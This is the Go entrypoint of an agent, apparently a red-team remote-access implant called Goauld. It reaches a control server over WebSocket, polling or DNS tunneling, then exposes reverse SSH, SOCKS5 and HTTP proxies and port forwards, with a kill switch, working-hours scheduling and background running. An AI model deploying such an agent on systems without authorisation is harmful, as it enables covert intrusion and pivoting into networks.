// Package main holds the agent entrypoint
package main

import (
	"Goauld/agent/keepawake/keepawake"
	"Goauld/agent/proxy"
	"Goauld/agent/ssh/transport"
	"Goauld/agent/vscode"
	"Goauld/common"
	"Goauld/common/utils"
	"context"
	"errors"
	"fmt"
	"io"
	"net"
	"os"
	"os/signal"
	"strconv"
	"time"

	"Goauld/agent/config"
	"Goauld/agent/control"
	"Goauld/agent/socks"
	"Goauld/agent/ssh"
	"Goauld/agent/sshd"
	"Goauld/common/log"
	commonssh "Goauld/common/ssh"

	"github.com/cenkalti/backoff/v5"
)

var globalCanceler *utils.GlobalCanceler

func main() {
	// Initialize the agent using the provided parameters (Command line, configuration file, environment variable)
	_, warnings, err := config.InitAgent()
	if err != nil {
		log.Error().Err(err).Msg("error initializing the agent")

		return
	}
	if config.Get().DoPrintVersion() {
		//nolint:forbidigo
		fmt.Println(common.GetVersion())

		return
	}
	if len(warnings) > 0 {
		for _, warning := range warnings {
			log.Warn().Err(warning).Msgf("agent init error")
		}
	}
	if config.Get().ShouldRunInBackground() {
		err := config.Get().StartInBackground()
		if err != nil {
			log.Error().Err(err).Msg("error starting the agent in background")
		}

		return
	}
	if config.Get().DoGenerateConfig() {
		conf, err := config.Get().GenerateYAMLConfig()
		if err != nil {
			log.Error().Err(err).Msg("error generating the agent config")

			return
		}
		//nolint:forbidigo
		fmt.Println(conf)

		return
	}
	killSwitchDuration := KillSwitchLoop(config.Get().GetKillSwitchDays())
	// Define an operation function that returns a value and an error.
	// The value can be any type.
	// We'll pass this operation to Retry function

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	operation := func() (any, error) {
		log.Info().Msg("Starting agent")
		if config.Get().IsOutOfWorkingDay() {
			LogNextStart()

			return nil, backoff.RetryAfter(60)
		}
		cancelReason := run()
		if cancelReason.Status == utils.Exit {
			log.Kill().Str("Reason", cancelReason.Msg).Msg("Agent stopped")
			cancel()
			err := vscode.Cleanup()
			if err != nil {
				log.Warn().Err(err).Msg("error cleaning up VSCode after agent exit")
			}
			time.Sleep(time.Second)

			//nolint:nilnil
			return nil, nil
		}
		log.Reset().Str("Reason", cancelReason.Msg).Msg("Agent restarting")

		return nil, fmt.Errorf("agent restarting: %s", cancelReason.Msg)
	}

	exp := &backoff.ExponentialBackOff{
		InitialInterval:     time.Second,
		RandomizationFactor: 2,
		Multiplier:          1.5,
		MaxInterval:         5 * time.Minute,
	}
	result, err := backoff.Retry(
		ctx,
		operation,
		backoff.WithBackOff(exp),
		backoff.WithMaxTries(config.Get().GetMexRetries()),
		backoff.WithMaxElapsedTime(killSwitchDuration),
		backoff.WithNotify(func(_ error, _ time.Duration) {

		}),
	)
	if err != nil {
		log.Info().Err(err).Msg("Agent shut down")

		return
	}
	if result != nil {
		//nolint:forbidigo
		fmt.Println(result)
	}
}

func run() utils.CancelReason {
	var dnsTransport *transport.DNSSH
	cancelReason := make(chan utils.CancelReason)
	controlErr := make(chan error)
	sshdErr := make(chan error)
	sshErr := make(chan error)
	socksErr := make(chan error)
	httpProxyErr := make(chan error)

	var forwardedPorts []commonssh.RemotePortForwarding

	// configDone is a one time chan used to signal that the configuration exchange with the server is completed.
	// The signal is emitted by the socket.io handler, and the agent waits for it before starting component initialization
	// (sshd, ssh, socks, etc.)
	configDone := make(chan struct{})
	log.Info().Msg("Agent init done")

	ctx, cancel := context.WithCancel(context.Background())
	globalCanceler = &utils.GlobalCanceler{
		Cancel:       cancel,
		CancelReason: cancelReason,
	}
	defer cancel()

	var controlPlanClient *control.ControlPlanClient
	var err error

	// Define the different strategies to initialize the control socket
	//  Currently, all strategies are tried in order.
	socketOrder := []string{
		"Websocket",
		"Upgrade",
		"Polling",
		"DNS",
	}
	controlInitStrategy := map[string]control.InitStrategy{
		"Websocket": {
			Name: "Websocket",
			InitFunc: func(client *control.ControlPlanClient, success chan<- struct{}, chanErr chan<- error) error {
				return client.InitWs(success, chanErr)
			},
		},
		"Upgrade": {
			Name: "Upgrade",
			InitFunc: func(client *control.ControlPlanClient, success chan<- struct{}, chanErr chan<- error) error {
				return client.InitWsUpgrade(success, chanErr)
			},
		},
		"Polling": {
			Name: "Polling",
			InitFunc: func(client *control.ControlPlanClient, success chan<- struct{}, chanErr chan<- error) error {
				return client.InitPolling(success, chanErr)
			},
		},
		"DNS": {
			Name: "DNS",
			InitFunc: func(client *control.ControlPlanClient, success chan<- struct{}, chanErr chan<- error) error {
				if dnsTransport == nil {
					dnsTransport, err = transport.NewDNSSH()
					if err != nil {
						return err
					}
				}

				err = client.InitOverDNS(dnsTransport.ControlStream, success, chanErr)
				if err != nil {
					return err
				}

				// As the  control socket is established using DNS we consider that the only working protocol is DNS
				// so we set the RSSH protocol order to only DNS
				config.Get().SetRSSHOrder([]string{"DNS"})

				return nil
			},
		},
	}
	order := config.Get().GetRSSHOrder()
	if len(order) == 1 {
		if order[0] == "dns" {
			socketOrder = []string{"DNS"}
		}
		if order[0] == "http" {
			socketOrder = []string{"Polling"}
		}
		if order[0] == "ws" {
			socketOrder = []string{"Websocket"}
		}
	}

	success := false
	// We iterate over the different strategies to initialize the control socket
	// If the initialization is successful, we stop the loop
	controlMode := ""
	for _, socket := range socketOrder {
		initializer, ok := controlInitStrategy[socket]
		if !ok {
			continue
		}
		log.Info().Str("ControlMode", initializer.Name).Msg("Trying to connect to the control socket")
		cpc, err := control.Init(ctx, globalCanceler, configDone, controlErr, initializer.InitFunc)
		if err == nil {
			log.Info().Str("SocketMode", initializer.Name).Msg("Control plan started")
			success = true
			controlPlanClient = cpc
			controlMode = initializer.Name

			break
		}
		log.Error().Err(err).Str("ControlMode", initializer.Name).Msg("error initializing the control plan")
	}

	// If no strategy was successful, we restart the agent
	if !success {
		return utils.CancelReason{
			Status: utils.Restart,
			Msg:    "unable to init the control plan",
		}
	}

	if dnsTransport != nil {
		defer func(dnsTransport *transport.DNSSH) {
			err := dnsTransport.Close()
			if err != nil {
				log.Debug().Err(err).Msg("error while closing dns transport")
			}
		}(dnsTransport)
	}

	cancelCtrlC := HandleCtrlC(controlPlanClient, globalCanceler)
	defer cancelCtrlC()

	go func() {
		// Waiting for the configuration to be completed
		<-configDone

		// Create the client SSH
		sshAgent := ssh.NewSSHAgent()
		// defer sshAgent.Close()
		// Initialize the client SSH
		err = sshAgent.Init(ctx, dnsTransport)
		if err != nil {
			log.Error().Err(err).Msg("error initializing the SSH")
			globalCanceler.Restart("unable to init the SSH connection")

			return
		}

		// If the SSHD server is enabled, start it
		if config.Get().SshdEnabled() {
			sshdServer := sshd.NewSshdServer(ctx)

			rListener, rPort, err := sshAgent.GetRemoteConn(config.Get().RemoteForwardedSshdAddress())
			if err != nil {
				log.Error().Err(err).Msg("error initializing the SSHD connection")

				return
			}
			config.Get().UpdateSshdPort(rPort)

			go func() {
				select {
				case sshdErr <- sshdServer.Serve(rListener):
					if err != nil {
						log.Error().Err(err).Msg("socks server error")
					}
					err := sshdServer.Close()
					if err != nil {
						log.Warn().Err(err).Msg("sshd close error")
					}
				case <-ctx.Done():

					log.Info().Msg("Closing SSHD connection")
					err := sshdServer.Close()
					if err != nil {
						log.Warn().Err(err).Msg("sshd close error")
					}
				}
			}()
			log.Info().Str("Remote port", strconv.Itoa(rPort)).Msg("Remote SSHD server started")
			forwardedPorts = append(forwardedPorts, commonssh.RemotePortForwarding{
				ServerPort: config.Get().RemoteForwardedSshdPort(),
				AgentPort:  -1,
				AgentIP:    "0.0.0.0",
				Tag:        "SSHD",
			})
		}

		// If the socks5 server is enabled, start it
		if config.Get().SocksEnabled() {
			socks5, err := socks.NewSocks()
			if err != nil {
				log.Error().Err(err).Msg("error initializing the Socks5 server")
			}
			rListener, rPort, err := sshAgent.GetRemoteConn(config.Get().RemoteForwardedSocksAddress())
			if err != nil {
				log.Error().Err(err).Msg("error initializing the Socks5 connection")
			}
			config.Get().UpdateSocksPort(rPort)
			go func() {
				select {
				case socksErr <- socks5.Serve(rListener):
					if err != nil {
						log.Error().Err(err).Msg("socks server error")
					}
					err := socks5.Close()
					if err != nil && !errors.Is(err, io.EOF) {
						log.Warn().Err(err).Msg("socks close error")
					}
				case <-ctx.Done():
					err := socks5.Close()
					if err != nil && !errors.Is(err, io.EOF) {
						log.Warn().Err(err).Msg("socks close error")
					}
				}
			}()
			log.Info().Str("Remote port", strconv.Itoa(rPort)).Msg("Remote Socks5 server started")
			forwardedPorts = append(forwardedPorts, commonssh.RemotePortForwarding{
				ServerPort: config.Get().RemoteForwardedSocksPort(),
				AgentPort:  -1,
				AgentIP:    "0.0.0.0",
				Tag:        "SOCKS",
			})
		}

		// If the HTTP proxy server is enabled, start it
		if config.Get().HTTPProxyEnabled() {
			httpProxy := proxy.InitHTTPProxy()

			listener, err := net.Listen("tcp4", "127.0.0.1:0")
			//nolint:forcetypeassert
			port := listener.Addr().(*net.TCPAddr).Port
			if err != nil {
				log.Error().Err(err).Msg("error initializing the HTTP proxy connection")
			}
			rpf := commonssh.RemotePortForwarding{
				ServerPort: 0,
				AgentPort:  port,
				AgentIP:    "127.0.0.1",
				Tag:        "HTTP",
			}
			rPort, err := sshAgent.RemoteForward(ctx, rpf)

			config.Get().UpdateHTTPProxyPort(rPort)

			go func() {
				select {
				case httpProxyErr <- httpProxy.Server.Serve(listener):
					if err != nil {
						log.Error().Err(err).Msg("HTTP proxy server error")
					}
					err := httpProxy.Server.Close()
					if err != nil {
						log.Warn().Err(err).Msg("HTTP proxy close error")
					}
				case <-ctx.Done():
					err := httpProxy.Server.Close()
					if err != nil {
						log.Warn().Err(err).Msg("HTTP proxy close error")
					}
				}
			}()

			log.Info().Str("Remote port", strconv.Itoa(rPort)).Msg("Remote HTTP proxy server started")
			forwardedPorts = append(forwardedPorts, commonssh.RemotePortForwarding{
				ServerPort: config.Get().RemoteForwardedHTTPProxyPort(),
				AgentPort:  -1,
				AgentIP:    "0.0.0.0",
				Tag:        "HTTP",
			})
		}

		// For all porte forwards, launch the forwarding
		rpf := config.Get().GetRemotePortForwarding()
		for i := range rpf {
			port, err := sshAgent.RemoteForward(ctx, rpf[i])
			if err != nil {
				log.Error().Err(err).Str("Local", rpf[i].GetLocal()).Str("Remote", rpf[i].GetRemote()).Msg("error initializing the port forwarding")

				continue
			}
			rpf[i].ServerPort = port
			forwardedPorts = append(forwardedPorts, rpf[i])
			log.Info().Str("Local", rpf[i].GetLocal()).Str("Remote", rpf[i].GetRemote()).Msg("Port forwarding started")
		}

		err := controlPlanClient.SendPorts(forwardedPorts)
		if err != nil {
			log.Error().Err(err).Msg("error sending the forwarded ports")
		} else {
			log.Run().Str("Control", controlMode).Str("Mode", sshAgent.Mode).Msg("Agent successfully started.")
		}
	}()

	if config.Get().KeepAwake() {
		keepAwaker := keepawake.Keeper{}
		err := keepAwaker.StartIndefinite()
		if err != nil {
			log.Warn().Err(err).Msg("error starting the keep awake")
		}
		go func() {
			<-ctx.Done()
			err = keepAwaker.Stop()
			if err != nil {
				log.Warn().Err(err).Msg("keep awake close error")
			}
		}()
	}

	if config.Get().OnlyWorkingDays() {
		go OnlyWorkingDayLoop(ctx, globalCanceler)
	}
	// Wait for errors to occur and print them
	select {
	case err := <-controlErr:
		if err != nil {
			log.Error().Err(err).Msg("error starting the agent")
		}
	case err := <-sshdErr:
		if err != nil {
			log.Error().Err(err).Msg("error starting the sshd server")
		}
	case err := <-sshErr:
		if err != nil {
			log.Error().Err(err).Msg("error starting the ssh client")
		}
	case err := <-socksErr:
		if err != nil {
			log.Error().Err(err).Msg("error starting the socks server")
		}
	case err := <-httpProxyErr:
		if err != nil {
			log.Error().Err(err).Msg("error starting the http proxy")
		}
	case <-ctx.Done():
		log.Error().Err(ctx.Err())
	}
	reason := <-cancelReason

	return reason
}

// HandleCtrlC intercepts the ctrl-c events.
// It signals to close all running goroutines and wait one second to allow the agent to signal the disconnection
// to the server. Then it exits.
func HandleCtrlC(controlPlanClient *control.ControlPlanClient, canceler *utils.GlobalCanceler) func() {
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt)
	go func() {
		for sig := range c {
			log.Info().Str("signal", sig.String()).Msg("received signal")
			log.Info().Msg("Shutting down control plan")
			canceler.Exit("ctrl-c signal received")
			controlPlanClient.Close()
		}
	}()

	return func() {
		signal.Stop(c)
	}
}

func OnlyWorkingDayLoop(ctx context.Context, canceler *utils.GlobalCanceler) {
	t := time.NewTicker(1 * time.Minute)
	defer t.Stop()
	for {
		select {
		case <-t.C:
			if config.Get().IsOutOfWorkingDay() {
				log.Warn().Msg("Agent is now running out of working day")
				canceler.Restart("Agent out of working day")
			}
		case <-ctx.Done():
			return
		}
	}
}

func KillSwitchLoop(days int) time.Duration {
	if days == 0 {
		return 0
	}
	d := time.Duration(days*24) * time.Hour
	go func() {
		log.Debug().Int("Days", days).Time("Kill Time", time.Now().Add(d)).Msg("Killing switch")
		t := time.NewTimer(d)
		defer t.Stop()
		<-t.C
		if globalCanceler != nil {
			globalCanceler.Exit("Kill switch activated")
		}
		time.Sleep(3 * time.Second)
		os.Exit(4)
	}()

	return d
}

func LogNextStart() {
	next, now, err := config.Get().NextStart()
	if err != nil {
		log.Warn().Err(err).Msg("error getting the next start date")
		log.Warn().Str("Start", config.Get().StartTime()).Msgf("Agent is out of working day")
	} else {
		log.Warn().Time("Now", now).Time("Next Start", next).Msgf("Agent is out of working day")
	}
}

/*func Delay(i int) {
	// Exponential backoff with jitter
	delay := baseDelay * (1 << i)
	if delay > maxDelay {
		delay = maxDelay
	}
	jitter := time.Duration(rand.Int63n(int64(delay / 2)))
	sleepDuration := delay + jitter
	return sleepDuration
}
*/
